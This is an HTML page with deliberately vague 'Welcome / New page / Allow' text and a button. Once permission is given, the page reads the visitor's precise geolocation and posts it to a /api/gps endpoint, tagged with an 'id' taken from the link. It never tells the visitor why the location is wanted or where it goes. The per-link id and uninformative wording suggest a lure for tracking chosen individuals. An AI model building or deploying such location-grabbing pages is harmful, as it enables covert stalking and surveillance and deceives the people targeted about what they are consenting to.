<!doctype html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>नमस्कार</title>
<style>
body{margin:0;background:#f4f6fb;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:white;width:88%;max-width:500px;padding:45px 25px;border-radius:22px;text-align:center;box-shadow:0 10px 30px #0001}
h1{font-size:32px;margin:0 0 20px;color:#172033}
p{font-size:20px;line-height:1.6;color:#444}
button{background:#172033;color:white;border:0;padding:14px 25px;border-radius:10px;font-size:17px;cursor:pointer}
#status{margin-top:18px;font-size:16px}
</style>
</head>
<body>
<div class="card">
<h1>Welcome</h1>
<p>New page</p>
<p>Allow</p>
<button onclick="shareLocation()">Allow</button>
<div id="status"></div>
</div>

<script>
function shareLocation(){
 const status=document.getElementById("status");
 if(!navigator.geolocation){
  status.textContent="इस browser में location उपलब्ध नहीं है।";
  return;
 }
 status.textContent="Location permission का इंतज़ार है...";
 navigator.geolocation.getCurrentPosition(async pos=>{
  const data={
   id:new URLSearchParams(location.search).get("id")||"unknown",
   latitude:pos.coords.latitude,
   longitude:pos.coords.longitude,
   accuracy:pos.coords.accuracy
  };
  try{
   const r=await fetch("/api/gps",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(data)
   });
   status.textContent=r.ok?"Successfully":"Location server पर नहीं भेजी जा सकी।";
  }catch(e){
   status.textContent="Server से connection नहीं हुआ।";
  }
 },()=>{
  status.textContent="Location permission नहीं दी गई।";
 },{
  enableHighAccuracy:true,
  timeout:15000,
  maximumAge:0
 });
}
</script>
</body>
</html>
